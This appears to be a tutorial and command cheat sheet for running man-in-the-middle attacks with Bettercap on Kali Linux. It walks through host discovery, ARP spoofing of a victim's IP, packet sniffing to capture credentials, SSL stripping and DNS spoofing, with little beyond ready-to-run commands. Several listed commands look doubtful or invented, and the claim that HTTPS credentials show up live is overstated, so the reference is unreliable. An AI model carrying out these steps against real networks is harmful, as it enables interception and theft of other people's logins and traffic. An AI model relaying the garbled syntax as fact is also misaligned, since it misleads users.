## 🚀 **Comprehensive Guide to Bettercap for MITM Attacks in Kali Linux**

Bettercap is a powerful, modern tool designed for performing Man-in-the-Middle (MITM) attacks. It offers a user-friendly experience and extensive capabilities to intercept, analyze, and manipulate network traffic.

### Step-by-Step Guide to Using Bettercap

**Step 1: Installation (Typically pre-installed on Kali Linux)**

Update your repository and install Bettercap:

```bash
sudo apt update
sudo apt install bettercap
```

**Step 2: Starting Bettercap**

Launch Bettercap specifying your network interface:

```bash
sudo bettercap -iface eth0
```
*(Replace `eth0` with your network interface, e.g., `wlan0`)*

### 🔧 **Important Parameters:**
- **-iface**: Specifies the network interface to use (e.g., eth0, wlan0).
- **-eval**: Executes a specific command upon launch (e.g., `-eval "net.probe on"`).

**Step 3: Network Discovery**

Activate network discovery modules:

```bash
net.probe on    # Sends ICMP probes to detect live hosts
net.recon on    # Passively discovers hosts on the network
```

### 🔧 **Additional Commands for Network Discovery:**
- `net.probe off`: Stops active network probing.
- `net.recon off`: Stops passive network reconnaissance.

**Step 4: Identifying Targets**

List all devices discovered on the network:

```bash
net.show
```

This command lists IP and MAC addresses, hostnames, and vendor information of devices.

**Step 5: Initiating MITM Attack (ARP Spoofing)**

Set your target and enable ARP spoofing:

```bash
set arp.spoof.targets TARGET_IP
arp.spoof on
```
*(Replace `TARGET_IP` with your victim's IP address. Multiple IPs can be separated by commas.)*

### 🔧 **ARP Spoofing Commands:**
- `arp.spoof.targets`: Specifies targets by IP.
- `arp.spoof.whitelist`: Excludes certain IPs from spoofing.
- `arp.spoof.internal`: Set to true/false to spoof internal gateway communication.

**Step 6: Sniffing Network Traffic**

Activate packet sniffing to capture credentials and other data:

```bash
net.sniff on
```

### 🔧 **Additional Sniffing Commands:**
- `net.sniff.local`: Capture local traffic (default: false).
- `net.sniff.output`: Saves captured traffic to a file (e.g., `set net.sniff.output capture.pcap`).

**Step 7: Monitoring Captured Data**

Captured credentials and data (HTTP, HTTPS, FTP, etc.) will appear live in your terminal.

**Step 8: Ending the MITM Attack**

Stop the attack gracefully and exit Bettercap:

```bash
arp.spoof off
net.sniff off
net.probe off
net.recon off
exit
```

------------------------------------------------------------------------------

# Generally Commands

## 🚀 **Comprehensive Bettercap Command List**

Here's an extensive list of commonly used commands, parameters, and detailed explanations for Bettercap, a powerful penetration testing and network analysis tool:

### 📡 **General Commands:**
- `help`: Display help information about Bettercap and its modules.
- `exit`: Exit the Bettercap application.
- `clear`: Clear the current terminal screen.
- `sessions`: Show current active sessions.
- `version`: Show Bettercap version information.

### 🌐 **Network Interface & Basic Setup:**
- `-iface <interface>`: Specify the network interface to use (e.g., eth0, wlan0).
- `-eval <commands>`: Execute specific commands automatically at startup.
- `-caplet <path>`: Load and execute commands from a caplet file (script file).
- `-no-colors`: Disable colored terminal output.
- `-silent`: Run Bettercap without banner or verbose messages.

### 🛠️ **Network Discovery & Reconnaissance:**
- `net.probe on/off`: Actively scan network devices using ICMP requests.
- `net.recon on/off`: Passively identify hosts on the network.
- `net.show`: Display discovered devices, including IP, MAC, and hostname information.
- `net.clear`: Clear discovered device information.

### 🎯 **ARP Spoofing (MITM Attacks):**
- `set arp.spoof.targets <IP(s)>`: Set specific target IP(s) for ARP spoofing.
- `arp.spoof on/off`: Enable or disable ARP spoofing.
- `set arp.spoof.internal true/false`: Enable spoofing of internal network communications.
- `set arp.spoof.whitelist <IPs>`: IP addresses excluded from spoofing.

### 📥 **Packet Sniffing:**
- `net.sniff on/off`: Begin or halt packet capturing.
- `set net.sniff.local true/false`: Capture local (host) traffic (default is false).
- `set net.sniff.output <file.pcap>`: Save captured network traffic to a file.
- `net.sniff.stats`: Show statistics about the sniffed traffic.

### 🔐 **HTTPS & SSL Stripping:**
- `https.proxy on/off`: Enable or disable HTTPS interception.
- `set https.proxy.sslstrip true/false`: Activate SSL stripping to downgrade HTTPS to HTTP.
- `set https.proxy.certificate <path>`: Use a custom SSL certificate for HTTPS interception.
- `https.proxy.hosts`: List hosts currently targeted by HTTPS interception.

### 📤 **DNS Spoofing:**
- `dns.spoof on/off`: Start or stop DNS spoofing.
- `set dns.spoof.address <IP>`: Redirect targeted DNS requests to a specified IP.
- `set dns.spoof.domains <domains>`: Specific domains to spoof (comma-separated).

### 🔍 **Credential Capturing & Analysis:**
- `net.sniff.credentials on/off`: Capture usernames and passwords from intercepted traffic.
- `credentials.show`: Display captured credentials.
- `credentials.clear`: Clear the captured credentials log.

### 📤 **Spoofing & Manipulation:**
- `spoof.redirect on/off`: Redirect traffic to another IP address.
- `set spoof.dns true/false`: Toggle DNS spoofing capabilities.
- `set http.proxy.script <script>`: Execute custom scripts to manipulate HTTP traffic.

### 📁 **Data & Logs Management:**
- `events.show`: Display logged events.
- `events.clear`: Clear logged events.
- `set events.stream.output <file>`: Redirect event logging to a specified file.

### 💻 **Web Interface (Web UI):**
- `ui.help`: Show help for the Bettercap Web interface.
- `ui.update`: Update the Web UI module.
- `ui.run`: Launch Bettercap’s Web UI interface for visual interaction and control.

### 🛠️ **Additional Useful Commands:**
- `alias`: Define shortcuts for frequently used commands.
- `set`: View or set module-specific options.
- `get`: Retrieve current values for options.



